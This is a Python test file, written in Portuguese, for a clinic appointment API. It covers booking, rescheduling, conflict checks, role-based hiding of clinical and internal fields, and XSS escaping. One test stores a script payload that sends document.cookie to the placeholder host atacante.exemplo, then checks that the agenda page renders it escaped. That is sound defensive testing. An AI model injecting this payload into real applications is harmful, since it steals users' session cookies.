from conftest import HELENA, JOAO, RECEPCAO, amanha_as, entrar_na_recepcao

CAMPOS_INTERNOS = {"token_auditoria", "criado_por_id", "criado_em", "atualizado_em", "ip_origem"}


def test_profissional_cria_consulta_e_ela_aparece_na_listagem(cliente, autenticar):
    cabecalhos = autenticar(HELENA)
    nova = {"paciente_id": 3, "inicio": amanha_as(15), "duracao_minutos": 30, "motivo": "Avaliação de rotina"}

    criada = cliente.post("/consultas", json=nova, headers=cabecalhos)
    assert criada.status_code == 201
    corpo = criada.json()
    assert corpo["paciente_nome"] == "Pedro Albuquerque"
    assert corpo["profissional_nome"] == "Dra. Helena Prado"
    assert corpo["status"] == "agendada"

    listagem = cliente.get("/consultas", headers=cabecalhos)
    assert listagem.status_code == 200
    assert corpo["id"] in [c["id"] for c in listagem.json()]

    detalhe = cliente.get(f"/consultas/{corpo['id']}", headers=cabecalhos)
    assert detalhe.status_code == 200
    assert detalhe.json() == corpo


def test_profissional_remarca_e_cancela_a_propria_consulta(cliente, autenticar):
    cabecalhos = autenticar(HELENA)
    alteracao = {
        "inicio": amanha_as(16, 30),
        "duracao_minutos": 45,
        "status": "confirmada",
        "motivo": "Retorno com resultado de holter",
        "observacoes": "Remarcada a pedido do paciente",
    }
    remarcada = cliente.put("/consultas/4", json=alteracao, headers=cabecalhos)
    assert remarcada.status_code == 200
    assert remarcada.json()["status"] == "confirmada"
    assert remarcada.json()["duracao_minutos"] == 45

    cancelada = cliente.delete("/consultas/4", headers=cabecalhos)
    assert cancelada.status_code == 200
    assert cancelada.json()["status"] == "cancelada"


def test_horario_ocupado_e_recusado(cliente, autenticar):
    cabecalhos = autenticar(HELENA)
    conflito = {"paciente_id": 3, "inicio": amanha_as(11, 15), "motivo": "Encaixe"}
    resposta = cliente.post("/consultas", json=conflito, headers=cabecalhos)
    assert resposta.status_code == 409


def test_resposta_json_nao_expoe_campos_internos(cliente, autenticar):
    cabecalhos = autenticar(HELENA)
    detalhe = cliente.get("/consultas/1", headers=cabecalhos).json()
    listagem = cliente.get("/consultas", headers=cabecalhos).json()

    assert CAMPOS_INTERNOS.isdisjoint(detalhe)
    for consulta in listagem:
        assert CAMPOS_INTERNOS.isdisjoint(consulta)


def test_contrato_openapi_nao_declara_campos_internos(cliente):
    esquemas = cliente.get("/openapi.json").json()["components"]["schemas"]
    for nome in ("ConsultaPublic", "ConsultaAgenda"):
        assert CAMPOS_INTERNOS.isdisjoint(esquemas[nome]["properties"])
    assert "cpf" not in esquemas["PacientePublic"]["properties"]


def test_agenda_da_recepcao_nao_traz_motivo_clinico(cliente, autenticar):
    agenda = cliente.get("/consultas/agenda", headers=autenticar(RECEPCAO))
    assert agenda.status_code == 200
    assert agenda.json()
    for item in agenda.json():
        assert "motivo" not in item
        assert CAMPOS_INTERNOS.isdisjoint(item)


def test_pagina_da_agenda_exibe_payload_xss_como_texto(cliente, autenticar):
    payload = "<script>document.location='https://atacante.exemplo/?c='+document.cookie</script>"
    alteracao = {
        "inicio": amanha_as(9),
        "duracao_minutos": 30,
        "status": "agendada",
        "motivo": "Retorno com resultado de holter",
        "observacoes": payload,
    }
    assert cliente.put("/consultas/4", json=alteracao, headers=autenticar(HELENA)).status_code == 200

    entrar_na_recepcao(cliente, RECEPCAO)
    dia = amanha_as(9)[:10]
    pagina = cliente.get(f"/web/agenda?data={dia}")

    assert pagina.status_code == 200
    assert "<script>document.location" not in pagina.text
    assert "&lt;script&gt;document.location=&#39;https://atacante.exemplo/?c=&#39;+document.cookie&lt;/script&gt;" in pagina.text
    assert "Retorno com resultado de holter" not in pagina.text


def test_paciente_lista_apenas_as_proprias_consultas(cliente, autenticar):
    consultas = cliente.get("/consultas", headers=autenticar(JOAO)).json()
    assert consultas
    assert {c["paciente_id"] for c in consultas} == {1}
